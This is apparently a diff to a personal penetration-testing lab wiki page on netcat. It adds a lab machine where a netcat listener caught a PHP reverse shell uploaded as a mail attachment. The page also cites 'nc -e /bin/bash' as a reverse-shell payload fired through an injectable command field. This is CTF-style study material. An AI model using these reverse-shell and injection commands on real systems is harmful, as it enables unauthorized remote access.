@@ -31,4 +31,4 @@ nc TARGET 443 < in.bin    # sender
 
 ## Seen in
 
-Listener for reverse shells in [[hannah-coffee]], [[baluhome]], [[ignite]], [[balulero]], [[autoescuela]], [[grooti]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[domain]] (privileged port `433`, run with `sudo`), [[file]] (`sudo nc -lvnp 4443` behind the uploaded `.phar`); used to trigger [[vsftpd-backdoor]] in [[first-hacking]] and [[tproot]]; raw TCP client for the [[wargames]] WOPR text game; `nc -e /bin/bash` as the outgoing payload fired through a `cmd` field on [[dark]].
+Listener for reverse shells in [[hannah-coffee]], [[baluhome]], [[ignite]], [[balulero]], [[autoescuela]], [[grooti]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[domain]] (privileged port `433`, run with `sudo`), [[file]] (`sudo nc -lvnp 4443` behind the uploaded `.phar`), [[nexus]] (`sudo nc -lvnp 443` behind the pentestmonkey PHP shell uploaded as a mail attachment); used to trigger [[vsftpd-backdoor]] in [[first-hacking]] and [[tproot]]; raw TCP client for the [[wargames]] WOPR text game; `nc -e /bin/bash` as the outgoing payload fired through a `cmd` field on [[dark]].
